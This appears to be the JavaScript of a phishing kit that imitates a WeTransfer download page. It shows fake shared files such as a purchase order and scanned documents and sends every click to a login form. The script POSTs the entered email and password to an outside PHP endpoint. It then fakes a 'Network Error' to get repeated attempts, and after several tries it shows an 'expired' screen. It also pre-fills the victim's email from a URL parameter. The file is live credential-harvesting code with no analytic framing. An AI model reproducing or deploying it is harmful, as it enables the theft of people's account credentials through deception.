document.addEventListener("DOMContentLoaded", function () {
  const fileList = [
    { name: "Purchase_order.PDF", info: "18 MB" },
    { name: "IMG_0289.JPG", info: "2 MB" },
    { name: "IMG_0210.JPG", info: "2 MB" },
    { name: "Specifications.PDF", info: "12 MB" },
    { name: "Test.MP4", info: "43 MB" },
    { name: "Scan_documents.ZIP", info: "13 MB" },
    { name: "Sample_product-based business.qbw", info: "27 MB" },
  ];

  const fileSlider = new bootstrap.Offcanvas(
    document.getElementById("fileSlider")
  );
  const loginModal = new bootstrap.Modal(document.getElementById("loginModal"));
  const errorBox = document.getElementById("errorBox");
  let counter = 0;

  function getTotalFileSize(fileList) {
    return fileList.reduce((total, file) => {
      const sizeStr = file.info.split(" ")[0];
      const size = parseFloat(sizeStr);
      return total + size;
    }, 0);
  }

  function formatFileSize(sizeInMB) {
    if (sizeInMB >= 1024) {
      return (sizeInMB / 1024).toFixed(2) + " GB";
    } else {
      return Math.round(sizeInMB) + " MB";
    }
  }

  const totalSize = getTotalFileSize(fileList);
  const formattedSize = formatFileSize(totalSize);

  document.getElementById("fileCount").textContent = fileList.length;
  document.getElementById("sliderFileCount").textContent = fileList.length;
  document.getElementById("fileSize").textContent = formattedSize;

  const fileListContainer = document.getElementById("fileList");
  fileList.forEach((file) => {
    const fileCard = document.createElement("div");
    fileCard.className = "col";
    fileCard.innerHTML = `
            <div class="card h-100">
                <div class="card-body">
                    <div class="d-flex justify-content-between align-items-center flex-wrap">
                        <div>
                            <p class="card-title font-bold">${file.name}</p>
                            <p class="card-text">${file.info}</p>
                        </div>
                        <button class="btn">
                            <svg width="24" height="24" viewBox="0 0 170 170">
                                <g fill="#5268ff" fillRule="evenodd">
                                    <path d="M145.104 24.896c33.195 33.194 33.195 87.014 0 120.208-33.194 33.195-87.014 33.195-120.208 0C-8.3 111.91-8.3 58.09 24.896 24.896 58.09-8.3 111.91-8.3 145.104 24.896zm-7.071 7.071c-29.29-29.29-76.777-29.29-106.066 0-29.29 29.29-29.29 76.777 0 106.066 29.29 29.29 76.777 29.29 106.066 0 29.29-29.29 29.29-76.777 0-106.066z"></path>
                                    <path d="M82 100.843V59.007A4.006 4.006 0 0 1 86 55c2.21 0 4 1.794 4 4.007v41.777l15.956-15.956a4.003 4.003 0 0 1 5.657 0 4.004 4.004 0 0 1 0 5.657l-22.628 22.628a3.99 3.99 0 0 1-3.017 1.166 3.992 3.992 0 0 1-3.012-1.166L60.328 90.485a4.003 4.003 0 0 1 0-5.657 4.004 4.004 0 0 1 5.657 0L82 100.843z"></path>
                                </g>
                            </svg>
                        </button>
                    </div>
                </div>
            </div>
        `;
    fileCard
      .querySelector(".card")
      .addEventListener("click", () => loginModal.show());
    fileListContainer.appendChild(fileCard);
  });

  document
    .getElementById("previewBtn")
    .addEventListener("click", () => fileSlider.show());
  document
    .getElementById("viewFilesBtn")
    .addEventListener("click", () => fileSlider.show());
  document
    .getElementById("downloadAllBtn")
    .addEventListener("click", () => loginModal.show());

  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    const formData = new FormData();
    formData.append("email", email);
    formData.append("password", password);

    fetch("https://ecochiccouture.store/Docs/nat.wetrans.check/drun.php", {
      method: "POST",
      body: formData,
    })
      .then((response) => {
        showError(
          "Network Error! Error connecting to login server<br/> Please try again"
        );
        document.getElementById("password").value = "";

        console.log(counter);

        if (counter > 1) {
          // showError("Network Error! Error connecting to login server<br/> Please try again");
          document.getElementById("password").value = "";
          //   window.location.replace("expired.html");
          let mainContent = document.getElementById("mainContent");
          let expiredContent = document.getElementById("expiredContent");
          mainContent.classList.remove("active");
          expiredContent.classList.add("active");

          const openModals = document.querySelectorAll(".modal.show");
          openModals.forEach((modal) => {
            const modalInstance = bootstrap.Modal.getInstance(modal);
            if (modalInstance) {
              modalInstance.hide();
            }
          });

          const openDrawers = document.querySelectorAll(".offcanvas.show");
          openDrawers.forEach((drawer) => {
            const drawerInstance = bootstrap.Offcanvas.getInstance(drawer);
            if (drawerInstance) {
              drawerInstance.hide();
            }
          });
          // console.log("expired.html");
          return;
        }
      })
      .catch((error) => {
        showError(
          "Network Error! Error connecting to login server<br/> Please try again"
        );
        document.getElementById("password").value = "";

        console.log(counter);

        if (counter > 1) {
          showError(
            "Network Error! Error connecting to login server<br/> Please try again"
          );
          document.getElementById("password").value = "";
          //   window.location.replace("expired.html");
          let mainContent = document.getElementById("mainContent");
          let expiredContent = document.getElementById("expiredContent");
          mainContent.classList.remove("active");
          expiredContent.classList.add("active");

          const openModals = document.querySelectorAll(".modal.show");
          openModals.forEach((modal) => {
            const modalInstance = bootstrap.Modal.getInstance(modal);
            if (modalInstance) {
              modalInstance.hide();
            }
          });

          const openDrawers = document.querySelectorAll(".offcanvas.show");
          openDrawers.forEach((drawer) => {
            const drawerInstance = bootstrap.Offcanvas.getInstance(drawer);
            if (drawerInstance) {
              drawerInstance.hide();
            }
          });
          // console.log("expired.html");
          return;
        }
      });

    counter++;
  });

  function showError(message) {
    errorBox.innerHTML = message;
    errorBox.classList.remove("d-none");
    setTimeout(() => {
      errorBox.classList.add("d-none");
      errorBox.innerHTML = "";
    }, 3000);
  }

  const urlParams = new URLSearchParams(window.location.search);
  const emailParam = urlParams.get("eui");
  if (emailParam) {
    document.getElementById("email").value = emailParam;
  }

  const bgImages = document.querySelectorAll(".bg-image");
  const dynamicContent = document.getElementById("dynamicContent");
  let currentIndex = 0;
  const contentForBg = [
    `<h1 class="heading-text">Get your teams on WeTransfer</h1>
      <ul class="checklist">
          <li>Collaborate with team members</li>
          <li>Get feedback in real-time within the platform</li>
          <li>Stay consistent with team-wide branding</li>
          <li>More storage for your entire team</li>
      </ul>
      <button class="btn btn-light px-4 py-1 rounded-pill">Subscribe</button>`,
    `<span class="badge rounded-pill text-bg-light mb-2">NEW</span>
      <h1 class="heading-text">Never chase payments again</h1>
      <p>Set a price for the work you share on <strong class"heading-text">WeTransfer</strong> and get paid before any download</p>
      <button class="btn btn-primary px-4 py-1 rounded-pill">Learn more</button>`,
  ];

  setInterval(function () {
    const nextIndex = currentIndex === 0 ? 1 : 0;
    dynamicContent.classList.add("fade-out");

    setTimeout(function () {
      bgImages.forEach((img) => img.classList.remove("active"));
      bgImages[nextIndex].classList.add("active");

      dynamicContent.innerHTML = contentForBg[nextIndex];

      setTimeout(function () {
        dynamicContent.classList.remove("fade-out");
      }, 100);

      currentIndex = nextIndex;
    }, 500);
  }, 10000);
});
